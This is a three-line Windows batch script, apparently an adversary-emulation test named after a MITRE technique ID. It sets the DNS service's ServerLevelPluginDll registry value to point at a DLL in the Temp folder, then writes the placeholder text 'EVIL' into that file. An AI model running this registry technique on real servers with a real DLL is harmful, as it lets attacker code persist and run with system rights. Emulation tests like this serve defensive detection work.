@echo off
reg add HKLM\System\CurrentControlSet\Services\DNS\Parameters /v "ServerLevelPluginDll" /t REG_SZ /f /d "C:\Windows\Temp\T1543003001.dll"
echo "EVIL" >> C:\Windows\Temp\T1543003001.dll